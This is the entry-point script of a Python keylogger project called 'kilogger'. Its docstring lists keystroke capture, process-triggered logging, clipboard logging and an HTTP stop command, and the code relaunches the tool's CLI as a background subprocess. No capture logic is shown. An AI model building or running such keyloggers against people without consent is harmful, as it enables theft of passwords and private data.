"""
kilogger: A Keylogger Utility for Educational Purposes

Functionalities:
- Capture and log pressed keys.
- Watch processes to trigger keylogger.
- Log clipboard data.
- Stop logger with an HTTP request.

Disclaimer:
kilogger is intended for educational purposes only. It is not designed
for malicious use or unauthorized access. By using this project, you
agree to use it responsibly and ethically.
The developers of this project are not responsible for any misuse of
this tool, and users are responsible for their actions. This project
is provided "as is" without warranties.

Version: 1.0.0
"""
import subprocess
import sys

from kilogger.cli import main

if __name__ == '__main__':
    if sys.argv[1] == '--help':
        main(sys.argv)
    else:
        args = ['python', '-m', 'kilogger.cli']
        args.extend(sys.argv[1:])
        subprocess.Popen(args)
